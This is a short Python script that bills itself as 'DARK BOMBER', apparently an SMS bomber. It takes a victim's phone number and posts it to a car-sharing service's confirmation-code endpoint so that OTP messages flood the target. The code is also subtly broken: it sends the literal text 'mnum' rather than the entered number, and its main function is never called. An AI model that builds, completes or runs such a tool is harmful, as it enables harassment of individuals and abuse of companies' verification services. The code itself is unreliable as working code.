import requests, random, datetime, sys, time, argparse, os

banner = """
 ____________________________________________________
|                                                    |
| [--] Name: DARK BOMBER                             |
|                                                    |
| [--] Have Services: 1                              |
|                                                    |
| [--] Created by: https://github.com/               |
|                                                    |
| [--] Version: 1.0.0                                |
|____________________________________________________|
"""

print(banner)
mnum = input('Enter a Number (076#######)-->> ')
def numin():
	if len(mnum)==10:
		try:
			requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': 'mnum'}, headers={})

			print('[+] OTP CODE SENT!')
		except:
			print('Error Send')
	else:
		print("Enter a Valid Number")
